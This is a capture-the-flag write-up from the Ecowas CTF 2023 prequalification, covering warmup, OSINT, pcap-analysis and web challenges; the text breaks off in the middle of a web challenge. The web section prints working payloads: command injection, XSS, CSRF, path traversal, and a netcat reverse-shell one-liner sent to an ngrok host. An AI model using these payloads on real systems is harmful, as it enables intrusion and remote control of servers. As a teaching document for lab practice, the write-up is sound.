<h3>
    Ecowas CTF 2023 ( Prequalification )
</h3>

![1](https://github.com/markuched13/CTFLearn/assets/113513376/44459902-d3ed-4936-bbf8-fa1fe806481e)

Over about two weeks I and my team mates played as team `@error`

Here's the solution to the challenges we solved:

### Challenges Solved:

#### Warmup
- Netcat
- Grep
- Unix Master
- Strings
- Obada

#### Osint
- Ghost

#### Networking
- Cool Catche
- Molouze
- Mean People Seo
- The Secret Document
- Flavourable Tonkotsu Pork
- Tchakatou

#### Web
- Gweta
- Rue Princess
- Ezodédé
- Ezxss
- Chevrolet Traverse 
- Boarding
- Ezredirect
- SoppazShoes
- Favicons R Us
- Xss101
- Dagbe
- Photovi
- Gnomi
- Incredibly Self-Referential 
- Ayabavi
- Big Money
- Milouuu
- Fafame
- Maïmouna

#### Reverse Engineering
- Saint Rings
- Sesame
- Veyize
- Petstar
- DotNetBin
- Tometriii
- ReZerv3

#### Cryptography
- DecodeMe
- Hashes
- Read Me Please
- IZIrsa
- Ron Adi Leonard 
- Sakpatè
- Kashe Kanka 
- Goumin Fraca 
- Dangbui
- NOTgate
- Spot Terrorist Secret Message 

#### Forensics
- Fairytale
- Aledjo
- Etikonam
- Where is my Flash
- Assini
- Zangbeto
- A Peculiar Email 
- Sentinnelle
- Yaa Asantewa 


### Warmup 5/5

#### Netcat
![](https://hackmd.io/_uploads/B1nxEOKT3.png)

All we need to do for this challenge is to connect to the remote host using netcat ( per the challenge name :P )

On connecting to the host I got a prompt asking if we want the flag
![](https://hackmd.io/_uploads/BkXLEdFa2.png)

Of cause we do so I sent `yes`
![](https://hackmd.io/_uploads/rkRPEuKT2.png)

Cool we get the flag

```
Flag: flag{n3tc4t_d03s_n0t_g0_m30w}
```

#### Grep 
![](https://hackmd.io/_uploads/HJK3NOtp3.png)

After downloading the attached file, I just grepped for the flag since the file contains too much character 
![](https://hackmd.io/_uploads/BJkZBdFTn.png)

```
Flag: flag{9r3p_1n5t34d_0f_r34d1n9}
```

#### Unix Master
![](https://hackmd.io/_uploads/HkMNrdFpn.png)

Connecting to the remote instance shows the flag file
![](https://hackmd.io/_uploads/Bkh_rut6n.png)

When I tried reading the flag I got this error
![](https://hackmd.io/_uploads/Hyu9Bdta2.png)

Checking the running process shows where the remote instance server file is:
![](https://hackmd.io/_uploads/Sk7g8uFT3.png)

I checked the python script which was in the `/opt` directory and got this
![](https://hackmd.io/_uploads/SJ0HU_K6h.png)
![](https://hackmd.io/_uploads/r1-DIOY6h.png)

```python
#!/usr/bin/env python3
import subprocess
import os


def main():
    os.chdir("/unix-master")
    print("Use your knowledge to find the flag.")
    flag = open("flag.txt", "r")
    flag = flag.read()
    flag_access = False
    key_location = "/unix-master"
    key_is_here = False

    while True:
        error = open("/opt/errors/error.txt", "w+")
        if key_location == "/unix-master/lock":
            flag_access = True

        print(os.getcwd() + "$ ", end="")
        command = input()
        try:

            if os.getcwd() == key_location:
                key_is_here = True

            if command[0:2] == "cd":
                if len(command) > 3:
                    os.chdir(os.path.abspath(command[3:]))

            elif command[0:2] == "mv" and "key" in command:
                command = command.split(" ")

                if os.path.abspath(command[1][:-3]) == key_location:

                    if command[2][:-3] == "":
                        command[2] = "." + command[2]

                    if (
                        os.path.isdir(command[2][:-3]) and command[2][-3:] == "key"
                    ) or (
                        os.path.isdir(command[2].strip(" /")) and command[1] == "key"
                    ):
                        key_location = os.path.abspath(command[2])
                        flag_access = True
                        print("Key moved to " + key_location + ".\n")
                    else:
                        print("Destination does not exist.\n")

                else:
                    print("Source does not exist or cannot be accessed.\n")

            else:
                if command[0:2] == "ls":
                    command = "ls -F" + command[2:]

                out = subprocess.check_output(command, stderr=error, shell=True).decode(
                    "ascii"
                )

                command = command.split(" ")
                if command[0] == "ls":
                    if (len(command) == 2 and os.getcwd() == key_location) or (
                        len(command) > 2 and key_location == os.path.abspath(command[2])
                    ):
                        out = out + "key*\n"

                if flag in out:
                    if not flag_access:
                        out = out.replace(flag, "*Flag hidden. Gain access to read.*")
                    else:
                        print("\nWho are you? ")
                        if input() != "cool-user":
                            out = out.replace(
                                flag, "*Flag hidden. Gain access to read.*"
                            )

                print(out)

                if flag in out:
                    break
        except:
            error.seek(0)
            print(error.read())
            pass

        key_is_here = False

        error.close()


if __name__ == "__main__":
    main()

"""
#!/usr/bin/env python3
import subprocess
import os

def main():
        os.chdir('/unix-master')
        print("Use your knowledge to find the flag.")

        while(True):
                error = open('/opt/errors/error.txt', 'w+')

                print(os.getcwd() + '$ ', end='')
                command = input().split(' ')
                try:
                        if command[0] == 'cd' and len(command) > 1:
                                os.chdir(os.path.abspath(command[1]))
                                pass

                        out = subprocess.check_output(command, stderr=error, shell=True).decode('ascii')
                        print(out)
                except:
                        error.seek(0)
                        print(error.read())
                        pass

        error.close()


if __name__ == "__main__":
        main()
"""
```

Due to trying to solve on time and not feeling to read the source code I assumed that since this just a 50pts task it shouldn't be hard!!!

I tried an alternate way of reading the flag

And my solution involves using `base32` binary to encode the flag then I'll decode it on my host
![](https://hackmd.io/_uploads/H1DkD_tan.png)

```
Flag: flag{kn0w_y0ur_un1x_c0mm4nd5}
```

#### Strings
![](https://hackmd.io/_uploads/SykXvOKan.png)

After downloading the attached file I checked the file type
![](https://hackmd.io/_uploads/ryxDDOt63.png)

So it's a x64 binary ............

I won't start explaining that

But from the challenge name it's referring to the `strings` command 

And that's what I used
![](https://hackmd.io/_uploads/Hkxow_K63.png)

```
Flag: flag{th4t5_4_l0t_0f_5tr1ng5}
```

#### Obada
![](https://hackmd.io/_uploads/rksbddta3.png)

After downloading the attached file and checking the file type I got it's a zip file
![](https://hackmd.io/_uploads/S1-QuuK6n.png)

I unzipped it and it extracted so many directories
![](https://hackmd.io/_uploads/rJDU_dYa3.png)

Hmmm what a pain! welp I just grepped my way out :stuck_out_tongue: 
![](https://hackmd.io/_uploads/HkhdOuY6n.png)

```
Flag: flag{9r3p_s4v3s_y0u_t1m3}
```

### Osint 1/1

#### Ghost
![](https://hackmd.io/_uploads/Hkx-YOta3.png)

After downloading the file attached and checking the file type, I got that it's a WAV file
![](https://hackmd.io/_uploads/SJwGFutp2.png)

Listening to it was playing a cricket sound :thinking_face: 

I opened it up in Sonic Visualiser and on viewing the spectogram I got this word
![](https://hackmd.io/_uploads/H1zjtuFpn.png)

```
Layer --> Add Spectogram
```

The word isn't aligned well

To fix that we can maybe tilt your laptop but that isn't going to be too understandable (obviously pain ikr) :smiling_imp:

So I used the zoom function to get this
![](https://hackmd.io/_uploads/SJYw9OKp2.png)

We see a cool guy with a laptop and also a word

Looking at the word well reads:

```
Feds We Need Some Time Apart
```

Searching that keyword on google shows this
![](https://hackmd.io/_uploads/B1qlsuKpn.png)

I got the date from the first link
![](https://hackmd.io/_uploads/S1ASoOF6n.png)

Below the blog shows the name of the Author
![](https://hackmd.io/_uploads/Hy89jut6h.png)

```
Flag: EcoWasCTF{thedarktangent_07/2013}
```

### Networking 6/6

#### Cool Catche
![](https://hackmd.io/_uploads/HyJl3_Yah.png)

After downloading the attached file on checking the file type shows this
![](https://hackmd.io/_uploads/rJHLhOF6n.png)

So it's a pcap file and not a zip archive file

I renamed it and opened it up in wireshark

We can see it contains just 24 packets
![](https://hackmd.io/_uploads/SJPK3_FTn.png)

Looking at the protocol hierarchy shows just TCP/Data
![](https://hackmd.io/_uploads/B1iq3OFa2.png)

```
Statistics --> Protocol Hierarchy
```

From the challenge description it's obvious that we should just follow TCP Stream

And that's what I did
![](https://hackmd.io/_uploads/SJs02OFp2.png)

```
Flag: flag{hello-hello-follow-me-okay}
```

#### Molouze
![](https://hackmd.io/_uploads/BJeMaOtT2.png)

After downloading the attached file, checking the file type shows it's a pcap file
![](https://hackmd.io/_uploads/H1_Qa_Yah.png)

Opening in it wireshark shows it contains `16195` packet
![](https://hackmd.io/_uploads/Bk8S6_KT3.png)

From the challenge description it's asking us to find the password in the unsecured protocol used

Checking the protocol hierarchy shows `telnet` 
![](https://hackmd.io/_uploads/BJPvTOY6h.png)

We know that `telnet` isn't secured as the information passed when using telnet is being transferred as plaintext

So I selected that as filter and followed tcp stream


```
Flag: flag{i_am_the_prez_plaintext_is_enuff_4_me}
```

##### Mean People Seo
![](https://hackmd.io/_uploads/ryvl0dKTn.png)

Downloading the file attached showed it's a wireshark traffic file
![](https://hackmd.io/_uploads/HyHzAdF6h.png)

The challenge description says we need the password so let us open this file up in wireshark

They were lots of traffic there
![](https://hackmd.io/_uploads/H1940uKT3.png)

Checking the protocol hierarchy shows this
![](https://hackmd.io/_uploads/BkTSAuYph.png)

There are some HTTP traffic so I filtered wireshark to show only the http traffic
![](https://hackmd.io/_uploads/r1-uCdKTn.png)

It was still quite much and if we are looking for a password then likely it's a POST request :thinking_face: 

So I added another filter
![](https://hackmd.io/_uploads/r18oAdYp3.png)

```
http && http.request.method == POST
```

Cool there's a post request to `/login/login` checking it showed the password
![](https://hackmd.io/_uploads/B1HxyKFTh.png)

And the flag is the password which is

```
Flag: 727@Nne6c0#n
```

#### The Secret Document 
![](https://hackmd.io/_uploads/B1RNkKt6n.png)

Downloading the attached file showed it's a pcap file
![](https://hackmd.io/_uploads/rkiY1KF6h.png)

When I opened it in wireshark I got that it contains 487 packets
![](https://hackmd.io/_uploads/B1XikYtpn.png)

To know the protocols here I did the usual :slightly_smiling_face: 
![](https://hackmd.io/_uploads/SkYp1FF63.png)

Interesting we have HTTP and FTP 

I applied the ftp data as filter then followed the TCP stream
![](https://hackmd.io/_uploads/H10kgFt62.png)

Hmmm there's a pdf file there

Then it also downloaded the pdf file according to the traffic from the pcap file
![](https://hackmd.io/_uploads/BkRzgYKa3.png)

Ok cool so since the file name is that of the challenge name we can assume that the flag is some how going to be there

I exported ftp data object (the pdf file btw) then saved the pdf file
![](https://hackmd.io/_uploads/H1oHeKFT2.png)

After downloading the file it shows that it is indeed a pdf file
![](https://hackmd.io/_uploads/S12wlKtT2.png)

I opened it up in firefox and got the flag
![](https://hackmd.io/_uploads/HkQKgKKp3.png)

```
Flag: flag{what_happens_next_will_surprise_you}
```

#### Flavorful Tonkotsu Pork 
![](https://hackmd.io/_uploads/HJdaxKFah.png)

After downloading the file and checking it's file type I got that it's a pcap file
![](https://hackmd.io/_uploads/B1sClFFah.png)

From the challenge name we can tell we'll be dealing with "FTP"

Opening it up and wireshark and checking protocol hierarchy shows ftp packets
![](https://hackmd.io/_uploads/ByTxWFta2.png)

I applied it as filter and followed TCP stream and got the flag
![](https://hackmd.io/_uploads/rJFrbtt62.png)

Quick thing to note is that when I followed tcp stream it started from stream 1 which took my few minutes for me to figure I missed checking stream 0 which is where the flag is

```
Flag: flag{ichirakurox!!}
```

#### Tchakatou
![](https://hackmd.io/_uploads/B1I3-tYa3.png)

We are given a packet file and a password list
![](https://hackmd.io/_uploads/HkCC-FYa2.png)

Opening the pcap file in wireshark shows this
![](https://hackmd.io/_uploads/Hy1-ftKa2.png)

Quite a lot of packets!!!

Checking protocol hierarchy shows http traffic was intercepted
![](https://hackmd.io/_uploads/H14mGtFT2.png)

I applied that as filter then on scrolling through the traffics I found this interesting
![](https://hackmd.io/_uploads/rkcrzKYTn.png)

It's downloaded a pdf file

So I exported object `http` and downloaded the pdf file
![](https://hackmd.io/_uploads/BkcuzKtTh.png)

Trying to open the pdf file requires a password
![](https://hackmd.io/_uploads/SyR9MtYT3.png)

So since we're given a password list it's ideal to brute force it

And I achieved that using `pdf2john` and cracking with `JTR`
![](https://hackmd.io/_uploads/BkCaGtKph.png)

Cool the pdf password is `LETUZAMEM'` 

Using that to open the pdf file worked and I got the flag
![](https://hackmd.io/_uploads/rJBlQKFah.png)

```
Flag EcoWasCTF{You_find_Me_yourAre_a_Netmaster}
```

### Web 20/20

#### Gweta
![](https://hackmd.io/_uploads/Byk0ZZq6h.png)

Going over to the url shows this
![](https://hackmd.io/_uploads/HJJMGZq63.png)

We can do things like set background image from remote url

But that isn't important

Taking a look at the page source shows this
![](https://hackmd.io/_uploads/B1yNGWqan.png)

We have `users.js` 

Clicking it shows this
![](https://hackmd.io/_uploads/BySrzZqT3.png)

```js
document.cookie = "username=guest";

if(document.cookie == "username=premium"){
    alert("PREMIUM: flag{" + ([]+{})[2] + (typeof null)[0] + (typeof NaN)[(typeof NaN).length - 1] + (typeof NaN[(typeof NaN).length - 1])[1] + ("" + (!+[]+[]+![]).length - 7) + ("" + (" " == 0)) +"}");
}
```

Basically it's checking if the cookie name `username` equals `premium`

And before it does that check it sets our cookie to `guest` making the if 

check returns false

There are two ways we can just solve this (at least I taught of this lol):
- Execute that javascript that will be ran if the check returns true
- Set our cookie name to `premium`

If we just paste the javascript code on the console it should alert the flag value
![](https://hackmd.io/_uploads/rkq3zZ5Tn.png)

Or we can just set our cookie value to equal `premium`!! But it turned out that won't work since each time I refresh the web page our cookie will be set 
to `guest`

So anyways I got the flag already

```
Flag: flag{born2true}
```

#### Rue princesse 
![](https://hackmd.io/_uploads/SJuGmZqph.png)

From the challenge description we need to check the header

I used curl to do that
![](https://hackmd.io/_uploads/rkPEmWcp3.png)

```
Flag: flag{who_run_the_world?_http_headers.}
```

#### Ezodédé
![](https://hackmd.io/_uploads/B1FwQ-qa3.png)

Going over to the url shows this
![](https://hackmd.io/_uploads/HJ357W56n.png)


Immediately from the ping function the web service provides we can tell this is going to be command injection

To confirm it I checked what files are in the current directory with this:
![](https://hackmd.io/_uploads/rJ4Tm-cp2.png)
```
;ls
```

Ok the flag is there too!! We can now concatenate it
![](https://hackmd.io/_uploads/BJfxEb962.png)
```
;cat flag.txt
```

And I got the flag

```
Flag: flag{tp_link_d_link_theyre_all_the_same}
```

#### EzXSS
![](https://hackmd.io/_uploads/H1r7V-q62.png)

The goal is to generate a malicious link to alert `win`

Going over the url shows this
![](https://hackmd.io/_uploads/HknDV-9ah.png)


What we search for gets reflected back


Injecting html tag worked
![](https://hackmd.io/_uploads/S1LANWca2.png)
```r
<h1> Wanna be leet?? </h1>
```

We can now use the `script` tag to `alert('win')`

Here's it:
![](https://hackmd.io/_uploads/HkpWSb563.png)
```r
<script> alert('win') </script>
```

Doing that I got the flag

```
Flag: flag{we_can_call_this_xss_level_0}
```

#### Chevrolet Traverse 
![](https://hackmd.io/_uploads/H108Bb5a2.png)

From the challenge description we can tell that we will be doing some directory transversal

Going over to the web page shows this
![](https://hackmd.io/_uploads/SkvoHWc62.png)

It shows a car 

Clicking the next button shows this
![](https://hackmd.io/_uploads/SJ52rb5ph.png)

Notice the way the url schema is, it's getting the image from the current directory

Removing that image name leads to directory listing where we can see various images
![](https://hackmd.io/_uploads/Byzk8Zc62.png)

Moving one step backward shows a directory which looks sus
![](https://hackmd.io/_uploads/r1jI8-cah.png)

The `secrets` directory looks interesting

Checking it shows that the flag is in there
![](https://hackmd.io/_uploads/H1CVL-qa3.png)

From here we can just get the flag
![](https://hackmd.io/_uploads/ByrYU-qT3.png)

Wait what no flag ??

Looking at the page source shows the flag is in it's url encoded form (might be hard to spot idk)
![](https://hackmd.io/_uploads/Hylh8b96n.png)

I url decoded it and got the flag
![](https://hackmd.io/_uploads/Hyj6LZcp2.png)

```
Flag: flag{vr00m_vr00m_now_y0u_r_z00m1ng}
```

#### Boarding
![](https://hackmd.io/_uploads/BkqJw-9T2.png)

After downloading the image it showed this
![](https://hackmd.io/_uploads/HyCzPZq63.png)

From the image it looks like a flight ticket boarding pass and we can get this information from it:

```
Name: Elon
Last Name: Musk
Ticket code: NPYQBK
```

Back on the web page shows this
![](https://hackmd.io/_uploads/SJTSwbqp3.png)

There's nothing interesting there except the `/manage` endpoint
![](https://hackmd.io/_uploads/HkXPvW9Th.png)

I provided the data we have (from the image downloaded) and submitted the form and on my network tab I got this
![](https://hackmd.io/_uploads/H1u9PWq6h.png)
![](https://hackmd.io/_uploads/HJGJOWqp2.png)

We can see it's loading `user_info.js` script

And the script is located `/static/js/{script}`
![](https://hackmd.io/_uploads/S1LMuW9p2.png)

Viewing the file showed the flag
![](https://hackmd.io/_uploads/SkvLuZcp2.png)

```
Flag: flag{when_you_play_ctf_and_find_elons_number}
```

#### Ezdirect
![](https://hackmd.io/_uploads/Hy9__bq6h.png)

The aim of this challenge is to build a url that redirects to `https://example.com/`

We are given the server python source code

Here's the content

```python
@app.route("/logout", methods=["GET", "POST"])
def logout():
    session.clear()
    return redirect("/")


@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = request.form["username"]
        password = request.form["password"].strip()
        errors = []

        user = Users.query.filter_by(username=username).first()
        if user:
            pass_test = verify_password(plaintext=password, ciphertext=user.password)
            if pass_test is False:
                errors.append("Incorrect password")
        else:
            errors.append("User does not exist")

        if errors:
            return render_template("login.html", errors=errors)

        session["id"] = user.id

        if request.args.get("next"):
            return redirect(request.args.get("next"))
        else:
            return redirect("/")

    if request.args.get("next"):
        if authed():
            return redirect(request.args.get("next"))

    return render_template("login.html")


@app.route("/register", methods=["GET", "POST"])
def register():
    if request.method == "POST":
        username = request.form["username"]
        password = request.form["password"]

        try:
            user = Users(username=username, password=password)
            db.session.add(user)
            db.session.commit()
        except IntegrityError:
            return render_template("register.html", errors=["That username is already taken"])

        session["id"] = user.id
        return redirect("/")

    return render_template("register.html")


@app.route("/notes", methods=["GET", "POST"])
def notes():
    if authed() is False:
        return redirect(url_for("login", next=url_for("notes")))

    user_id = session["id"]

    if request.method == "POST":
        text = request.form["text"]
        note = Notes(text=text, owner_id=user_id)
        db.session.add(note)
        db.session.commit()
        return redirect(url_for("notes"))

    notes = Notes.query.filter_by(owner_id=user_id)

    return render_template("notes.html", notes=notes)


@app.route("/")
def index():
    return render_template("index.html")
```

We have 5 routes but I won't go through them all (cause it's useless lol)

The open redirect vulnerability occurs in this portion of the code

```python 
@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = request.form["username"]
        password = request.form["password"].strip()
        errors = []

        user = Users.query.filter_by(username=username).first()
        if user:
            pass_test = verify_password(plaintext=password, ciphertext=user.password)
            if pass_test is False:
                errors.append("Incorrect password")
        else:
            errors.append("User does not exist")

        if errors:
            return render_template("login.html", errors=errors)

        session["id"] = user.id

        if request.args.get("next"):
            return redirect(request.args.get("next"))
        else:
            return redirect("/")

    if request.args.get("next"):
        if authed():
            return redirect(request.args.get("next"))

    return render_template("login.html")
```

We can see that if the `GET` parameter `?next` is in the `/login` route the web server will redirect to the url given

So the solution and the flag is this:

```
Flag: https://ctftogo-ezdirect.chals.io/login?next=https://example.com
```

#### SoppazShoes
![](https://hackmd.io/_uploads/ByqfYb5ah.png)

We are given the source code the web server uses

Here's the content

```python
@app.before_request
def session_start():
    if session.get("cart", None) is None:
        session["cart"] = []


@app.route("/")
def index():
    return redirect(url_for("shop"))


@app.route("/shop", defaults={"category": None})
@app.route("/shop/<category>")
def shop(category):
    categories = (
        Items.query.filter_by(hidden=False)
        .with_entities(Items.category)
        .distinct()
        .all()
    )
    categories = [c[0] for c in categories]
    items = Items.query.filter_by(category=category).all()
    return render_template("shop.html", categories=categories, items=items)


@app.route("/search")
def search():
    q = request.args.get("q", "")
    if q:
        items = Items.query.filter(Items.name.like(f"%{q}%")).all()
        resp = []
        for item in items:
            resp.append(
                {
                    "id": item.id,
                    "name": item.name,
                }
            )
    else:
        resp = []
    return jsonify(resp)


@app.route("/items/<int:item_id>", methods=["GET", "POST"])
def item(item_id):
    item = Items.query.filter_by(id=item_id).first_or_404()
    return render_template("item.html", item=item)


@app.route("/cart", methods=["GET", "POST", "DELETE"])
def cart():
    if request.method == "DELETE":
        item_id = int(request.form["item_id"])
        cart = session["cart"]
        try:
            cart.remove(item_id)
        except ValueError:
            return jsonify({"success": False})
        session["cart"] = cart
        return jsonify({"success": True})

    if request.method == "POST":
        item_id = int(request.form["item_id"])
        cart = session["cart"]
        if item_id not in cart:
            cart.append(item_id)
        session["cart"] = cart
        items = Items.query.filter(Items.id.in_(cart)).all()
        return render_template("cart.html", items=items)

    cart = session["cart"]
    items = Items.query.filter(Items.id.in_(cart)).all()
    return render_template("cart.html", items=items)


@app.route("/checkout")
def checkout():
    cart = session["cart"]
    items = Items.query.filter(Items.id.in_(cart)).all()
    return render_template("checkout.html", items=items)
```

To be honest I don't quite understand the goal of this challenge when I first tried it

But I noticed that in the `/items/` endpoint has various IDs

And the challenge description was referring to `All-Star Flags`

We can try manually getting what ID the shoe `All-Star Flags` is

But I noticed a function in the source code that lets us search value

```python
@app.route("/search")
def search():
    q = request.args.get("q", "")
    if q:
        items = Items.query.filter(Items.name.like(f"%{q}%")).all()
        resp = []
        for item in items:
            resp.append(
                {
                    "id": item.id,
                    "name": item.name,
                }
            )
    else:
        resp = []
    return jsonify(resp)
```

So we can make us of this to search for `All-Star Flags` 

Doing that gives this
![](https://hackmd.io/_uploads/SkixcZ5an.png)

Ok so the product is ID 40 and we can confirm it by accessing `/items/40`
![](https://hackmd.io/_uploads/rJNQ5-cp3.png)

I added it to my cart and checkout
![](https://hackmd.io/_uploads/rytVqb9T2.png)

And I got the flag
![](https://hackmd.io/_uploads/SJdB5ZcTh.png)

```
Flag:  flag{n0w_g3t_s0m3_r34l_y33zys}
```

#### Favicons R Us 
![](https://hackmd.io/_uploads/HyOD9Z9a2.png)

We are given the source code

Here's the content

```python
@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "POST":
        image = request.files["image"]
        size = request.form["size"]
        with tempfile.NamedTemporaryFile() as temp1, tempfile.NamedTemporaryFile() as temp2:
            temp1.write(image.read())
            cmd = f"convert {temp1.name} -resize {size} {temp2.name}"
            os.system(cmd)
            temp2.seek(0)
            image = b64encode(temp2.read()).decode("utf-8")
            return render_template("index.html", image=image)

    return render_template("index.html")
```

Basically it receives a file and resize it

And there's a command injection vulnerability at this point

```python=
image = request.files["image"]
size = request.form["size"]
cmd = f"convert {temp1.name} -resize {size} {temp2.name}"
os.system(cmd)
```

Why command injection? 

Well after the server receives our file it does some name conversion of the image name 

But the size parameter doesn't get changed so we have full control over that

And no form of sanitization is done when passing it to `system`

Making us able to inject our commands to be executed

But we don't get any command output back so this is a blind command injection

To exploit this I set up ngrok so as to get a reverse shell

First let us upload a file (it doesn't check file type so we can upload any file & we can just click that upload button it's not like we need it)
![](https://hackmd.io/_uploads/Byck2Z9p2.png)
![](https://hackmd.io/_uploads/H1XJT-qT2.png)

I'll be injecting my command in the size parameter

Here's the payload
![](https://hackmd.io/_uploads/SkgV6Zcp3.png)
```
16x16$(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 6.tcp.eu.ngrok.io 18433 >/tmp/f)
```

Back on my listener I got the shell :shell:
![](https://hackmd.io/_uploads/r1LvaZcpn.png)

Also the flag 

```
Flag: flag{not_as_good_as_toysrus_though}
```

#### Xss101
![](https://hackmd.io/_uploads/SJFfRb9Tn.png)

No source this time :(

Going over to the web page shows this
![](https://hackmd.io/_uploads/HJbt0Wqp2.png)

So let us start from Level 1

It shows a input box field
![](https://hackmd.io/_uploads/BkbjAb5Th.png)

Searching for something gets reflected
![](https://hackmd.io/_uploads/rJmpR-c6h.png)

We can inject html tags
![](https://hackmd.io/_uploads/SJx1yz96h.png)

The aim for all levels here is to call `alert('win')`

So I used the `<script>` tag to achieve this
![](https://hackmd.io/_uploads/r1NzkGq63.png)
```
Payload: <script>alert('win')</script>
```

It redirects to Level 2 link 
![](https://hackmd.io/_uploads/Sk8EkMqT2.png)

And on clicking it shows this
![](https://hackmd.io/_uploads/rJPSJM9T2.png)

Another input box field

I searched for something and got the result reflected
![](https://hackmd.io/_uploads/HkEwyzcph.png)

When I tried injecting javascript tag I got this
![](https://hackmd.io/_uploads/H1TOyGcan.png)

It doesn't seem to render as tag so I looked at the page source and got this
![](https://hackmd.io/_uploads/BJOcJMqTh.png)

Our input is in the value field 

And to escape it I'll use a double quote and `>`

Here's the updated payload
![](https://hackmd.io/_uploads/H1Enyf9pn.png)
```
Payload: "><script>alert('win')</script>
```

I got to Level 3 and it showed this
![](https://hackmd.io/_uploads/ByKexz9Th.png)

Same reflected content when we search anything
![](https://hackmd.io/_uploads/SkfMlfqT3.png)

But this time around we can't use `<` because it html encodes it
![](https://hackmd.io/_uploads/r1P7xM5pn.png)

I'm not a XSS person so I searched up bypass and found a payload used on a portswigger lab challenge

Here's the payload
```
Payload: " autofocus onfocus=alert('win') closeme="
```

Using that worked
![](https://hackmd.io/_uploads/r1Z_gG962.png)

In the next Level it just showed this
![](https://hackmd.io/_uploads/SJ75gf5ah.png)

Page source shows this
![](https://hackmd.io/_uploads/r1ujlf5ph.png)

This time it uses colour and our input will be in the `<script>` tag

Our input will also be html encoded

While looking for ways to solve this XSS challenge I came across a video that illustrated on how to bypass this but IDK where the link is again

But I saved the payload and here's it
```
Payload: %23000000'-alert('win')-'
```

Using that worked
![](https://hackmd.io/_uploads/BJslbfcp2.png)

And the next redirect link gave the flag
![](https://hackmd.io/_uploads/ByoMbMcT3.png)

```
Flag: flag{congrats_you_now_have_a_degree_in_xss}
```

#### Dagbé
![](https://hackmd.io/_uploads/HkLu-fca2.png)

Going over to the url shows this
![](https://hackmd.io/_uploads/SJmnWz96h.png)

From what is showing here we can tell we'll be doing CSRF

We have three endpoints

```
- /send
- /login
- /flag
```

In order to view the flag we need to be authenticated

But we don't actually have any credential so what do we do?

From the description in the `/send` endpoint

We know that when we provide a link the user which is likely already authenticated will access the provided link

At first I tried just accessing `/flag`
![](https://hackmd.io/_uploads/rJQcMM96h.png)

It then downloaded a video

Watching it shows this
![](https://hackmd.io/_uploads/SkKiGGqah.png)

Ok it's giving us the parameter needed to access the flag

Let us perform CSRF 

This is the script I'll be using:

```js
<form action="https://ctftogo-ezrf.chals.io/flag" method="POST">
    <input type="text" name="secret" value="this-means-im-admin">
    <input id="btn" type="submit">
</form>

<script>
    document.getElementById("btn").click();
</script>

```

Basically what it will do is just to access the `/flag` endpoint 

And since the user will be already authenticated we and the parameter is set we will get the flag

I hosted that on a ngrok server and submitted the url to the `/send` endpoint
![](https://hackmd.io/_uploads/rJZCXGqT2.png)
![](https://hackmd.io/_uploads/ByDTQGqah.png)

A video is downloaded and viewing it gives the flag
![](https://hackmd.io/_uploads/S1ql4M962.png)

```
Flag: flag{csrf_for_when_you_dont_have_xss}
```

#### Photovi
![](https://hackmd.io/_uploads/Bkn8Vzc6h.png)

We are given the source code and it's written in PHP

Checking it shows this
![](https://hackmd.io/_uploads/HkDT4zc62.png)

```php
<?php

namespace SharePhoto;

function render($app, $request, $response, $template, $title, $args=[]) {
    return $app->renderer->render($response, $template, array_merge([
        'title' => $title
    ], $args));
}

/**
 * Upload
 */
$app->post('/upload', function($request, $response, $args) {
    $user = $request->getAttribute('user');

    $files = $request->getUploadedFiles();
    $params = $request->getParsedBody();
    $err = false;
    if(array_key_exists('file', $files)) {
        $uploaded_file = $files['file'];

        $uploaded_file->moveTo(sprintf('uploads/%s', Util::generateRandomString(16)));
    }

    return Util::redirect($response, $this->router->pathFor('index'));
})->setName('upload');

/**
 * Show photo
 */
$app->get('/photo/{file_key}', function($request, $response, $args) {
    $fh = fopen(sprintf('uploads/%s', $args['file_key']), 'r');
    $stream = new \Slim\Http\Stream($fh);

    return $response
        ->withBody($stream)
        ->withHeader('Content-Type', 'image/jpeg');
})->setName('file');

$app->get('/', function($request, $response, $args) {
    $files = array_filter(scandir('uploads'), function($x) {
        return is_file(sprintf('uploads/%s', $x));
    });

    return render(
        $this, $request, $response,
        'index.html', 'Browse', [
            'files' => $files
        ]
    );
})->setName('index');
```

Basically it has two user endpoints which are `/upload` and `/photo` 

From the source of the `/upload` endpoint it allows arbitrary file upload and no form of check is done on the file being uploaded so we can potentially upload a `.php` file and just try execute it

Doing that throws back this error
![](https://hackmd.io/_uploads/rkFQSGqa2.png)
![](https://hackmd.io/_uploads/H1a-SG5pn.png)

The error is stating that the a function in a `Class` required for this upload to work isn't there

So that's a bummer

Let us continue viewing the source

The show photo function looks interesting 

```php
$app->get('/photo/{file_key}', function($request, $response, $args) {
    $fh = fopen(sprintf('uploads/%s', $args['file_key']), 'r');
    $stream = new \Slim\Http\Stream($fh);

    return $response
        ->withBody($stream)
        ->withHeader('Content-Type', 'image/jpeg');
})->setName('file');
```

Basically when we access `/photo/{file_name}` it will then:
- Use `fopen` to open up the file from the uploads directory and save the file descriptor in variable `fh`
- Then prints the response whose value contains the content returned when `fopen` was called

If you take a look at `fopen` php docs you will see this
![](https://hackmd.io/_uploads/Sy7crfq6h.png)
![](https://hackmd.io/_uploads/BJ7sHGq6n.png)

Main thing we need there is this
![](https://hackmd.io/_uploads/ryQ2SG9an.png)

Basically they are saying we should be careful escape certain character like backslash on Windows based system

But why is that so important? :thinking_face: 

Well we can perform a directory transversal if care is not done on our input 

Now we have another vuln sweet!

So our input will be `/photo/../../../../../../flag.txt` which will then turn into `/uploads/../../../../../../../flag.txt`

Trying that failed
![](https://hackmd.io/_uploads/r1rSIGqTh.png)

Damn how would we even know it works?

Notice that they didn't give `index.php` but `photovi.php`

So if we have the file read we can just confirm it works by reading `index.php`

Ok let's do that
![](https://hackmd.io/_uploads/S1xdUM56h.png)

What a bummer it doesn't work!

Since this is a making a `GET` request it is ideal to url encode the value but if it was `POST` we can pass in value without `urlencoding` it in case you are wondering why that well I watched it on a [box](https://www.youtube.com/watch?v=5dHgfviJWmg&t=378s) ippsec released few days ago 

Url encoding the special characters worked just well and I got the flag
![](https://hackmd.io/_uploads/rJV28zcph.png)

```
Flag: flag{Th3_tr4v3rs4l_m4st3r}
```

#### Gnomi
![](https://hackmd.io/_uploads/Bk8BDM96h.png)

Going over to the url shows this
![](https://hackmd.io/_uploads/ByXODGqp2.png)

I don't have any credential and the web server allows registration

So I created an account
![](https://hackmd.io/_uploads/ryk2vfcph.png)

It got me logged in already
